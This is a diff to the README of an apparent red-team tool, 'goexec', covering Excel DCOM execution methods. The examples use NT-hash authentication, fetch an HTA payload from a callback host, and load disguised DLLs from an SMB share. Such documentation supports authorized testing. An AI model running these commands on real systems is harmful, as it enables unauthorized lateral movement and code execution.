@@ -384,7 +384,7 @@ goexec dcom htafile "$target" \
   --url "http://callback.lan/payload.hta"
 ```
 
-#### `Excel.Application::ExecuteExcel4Macro` Method (`dcom excel-macro`)
+#### Excel `ExecuteExcel4Macro` Method (`dcom excel-macro`)
 
 The `excel-macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
 An Excel installation must be present on the remote host for this method to work.
@@ -416,11 +416,42 @@ goexec dcom excel-macro "$target" \
   --password "$auth_pass" \
   --command 'query session' -o-
 
-# Example of calling a Win32 API procedure via XLM
+# Use admin NT hash to directly call a Win32 API procedure via XLM
 goexec dcom excel-macro "$target" \
   --user "${auth_user}@${domain}" \
-  --password "$auth_pass" \
-  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","",0)'
+  --nt-hash "$auth_nt" \
+  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
+```
+
+#### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel-xll`)
+
+The excel-xll method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
+This method requires that the remote host has Microsoft Excel installed.
+
+```text
+Usage:
+  goexec dcom excel-xll [target] [flags]
+
+Execution:
+      --xll path   XLL/DLL local or UNC path
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Use admin password to execute XLL/DLL from an uploaded file
+goexec dcom excel-xll "$target" \
+  --user "${auth_user}" \
+  --nt-hash "$auth_nt" \
+  --xll 'C:\Users\localuser\Desktop\note.txt' # an XLL PE file with a .txt extension
+
+# Use admin NT hash to execute XLL/DLL from an SMB share
+goexec dcom excel-xll "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --xll '\\smbserver.lan\share\image.jpg' # an XLL PE file with a .jpg extension
 ```
 
 ### Task Scheduler Module (`tsch`)
